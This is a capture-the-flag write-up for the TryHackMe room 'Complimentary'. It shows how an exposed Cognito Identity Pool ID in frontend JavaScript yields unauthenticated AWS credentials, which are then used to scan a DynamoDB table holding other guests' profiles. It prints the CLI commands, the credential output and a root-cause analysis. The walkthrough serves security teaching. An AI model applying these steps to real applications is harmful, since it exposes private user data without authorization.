> **Platform:** TryHackMe
> 
> **Room:** Complimentary
> 
> **Category:** Cloud
> 
> **Tools Used:** AWS CLI, AWS Cognito, DynamoDB, IAM

# Complimentary

**Date:** 2026-08-11

## Description

> **Concierge Briefing:**
>
> Lambo installed the Byte Lotus Wellness app the day she arrived: it was free, it had great reviews (written by the app, but she didn't check), and it got her a tote bag for saying yes to camera, mic, contacts, and location access. No account needed. No login screen. It just… knows things about you the moment you open it.
>
> That's the whole pitch: “complimentary” access, no friction, no sign-up. Something still has to be deciding what you're allowed to see, even without a login, and whatever that something is, it isn't checking very carefully.
>
> Your objective: find out how the app knows anything about you at all, and see what else it's willing to hand over.

### Room Access

**Target:** [HTTP LINK]

## Objective

The room provides three main objectives:

* Identify the AWS mechanism issuing credentials to unauthenticated users.
* Use those credentials to access the application's DynamoDB table.
* Retrieve the flag from another guest's data.

## Reconnaissance

The first step was to inspect the application's frontend using the browser's developer tools.

Looking through the JavaScript files, the `app.js` file exposed AWS configuration values:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
    IdentityPoolId: IDENTITY_POOL_ID,
});
```

This immediately revealed that the application was using **Amazon Cognito Identity Pools** to obtain AWS credentials without requiring a traditional login.

The JavaScript also exposed the DynamoDB table name:

```text
complimentary-GuestWellnessProfiles
```

The important values discovered were:

| Parameter             | Value                                            |
| --------------------- | ------------------------------------------------ |
| AWS Region            | `us-east-1`                                      |
| Cognito Identity Pool | `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688` |
| DynamoDB Table        | `complimentary-GuestWellnessProfiles`            |

## Obtaining a Cognito Identity

Since the application uses a Cognito Identity Pool, the next step was to request an identity from the pool.

I used:

```bash
aws cognito-identity get-id \
  --region us-east-1 \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
```

The request returned an `IdentityId`:

```json
{
  "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
}
```

This identity could then be used to request temporary AWS credentials.

## Obtaining Temporary AWS Credentials

Using the returned `IdentityId`:

```bash
aws cognito-identity get-credentials-for-identity \
  --region us-east-1 \
  --identity-id "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
```

The response contained temporary AWS credentials:

```json
{
  "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13",
  "Credentials": {
    "AccessKeyId": "ASIAU2VYTBGYKP67ULN3",
    "SecretKey": "s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi",
    "SessionToken": "IQoJb3JpZ2luX2VjELv...",
    "Expiration": "2026-07-29T20:56:55+01:00"
  }
}
```

These credentials are temporary and associated with the unauthenticated Cognito identity.

I exported them as environment variables:

```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKP67ULN3"
export AWS_SECRET_ACCESS_KEY="s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELv..."
export AWS_DEFAULT_REGION="us-east-1"
```

## Identifying the IAM Role

Before interacting with AWS resources, I verified which identity and IAM role the temporary credentials were associated with:

```bash
aws sts get-caller-identity
```

The response was:

```json
{
  "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
  "Account": "332173347248",
  "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}
```

The important part is the assumed role:

```text
complimentary-cognito-unauth-role
```

This confirmed that the application was providing AWS credentials to an **unauthenticated Cognito identity**.

The security issue was not simply that credentials existed. The problem was that the unauthenticated role had excessive permissions.

## Accessing DynamoDB

The JavaScript had already revealed the DynamoDB table name:

```text
complimentary-GuestWellnessProfiles
```

I attempted to enumerate the table contents using:

```bash
aws dynamodb scan \
  --table-name complimentary-GuestWellnessProfiles
```

The command successfully returned multiple guest records:

```json
{
  "Items": [
    {
      "guest_id": { "S": "guest-vibe" },
      "name": { "S": "Vibe (Move Fast & Break Things)" },
      "email": { "S": "vibe@hackerholidays.thm" }
    },
    {
      "guest_id": { "S": "guest-lambo" },
      "name": { "S": "Lambo (@0xMia)" },
      "email": { "S": "lambo@hackerholidays.thm" }
    },
    {
      "guest_id": { "S": "guest-vip-042" },
      "name": { "S": "Guest VIP-042" },
      "notes": {
        "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. **FLAG IS HERE**"
      }
    }
  ],
  "Count": 5,
  "ScannedCount": 5
}
```

The scan showed that the role was able to read **multiple guest profiles**, rather than being restricted to the current user's record.

The `guest-vip-042` record contained the flag in its `notes` attribute.

## Vulnerability

The root cause was an **IAM misconfiguration involving an unauthenticated Cognito Identity Pool role**.

The application allowed users to obtain temporary AWS credentials without authenticating. Those credentials were then associated with the role:

```text
complimentary-cognito-unauth-role
```

That role had excessive permissions against the application's DynamoDB table.

Instead of restricting access to the current guest's profile, the role could perform a table-wide `Scan`, exposing other guests' data.

The attack chain was therefore:

```text
Web Application
      |
      v
Exposed Cognito Identity Pool ID
      |
      v
Unauthenticated Cognito Identity
      |
      v
Temporary AWS Credentials
      |
      v
complimentary-cognito-unauth-role
      |
      v
DynamoDB Scan
      |
      v
Other Guests' Profiles
      |
      v
Flag
```

## Flag

The flag was recovered from the `notes` field of the `guest-vip-042` record:

**FLAG IS HERE**

## Conclusion

The application did not require a traditional login, but that did not mean it was unauthenticated from an AWS perspective.

By inspecting the frontend JavaScript, it was possible to identify the Cognito Identity Pool used by the application. An unauthenticated identity could then obtain temporary AWS credentials and assume the `complimentary-cognito-unauth-role`.

Because that role had excessive DynamoDB permissions, the credentials could be used to scan the entire `complimentary-GuestWellnessProfiles` table and access other guests' information.

The key issue was therefore an **overly permissive IAM role assigned to unauthenticated Cognito identities**, combined with exposed client-side AWS configuration.
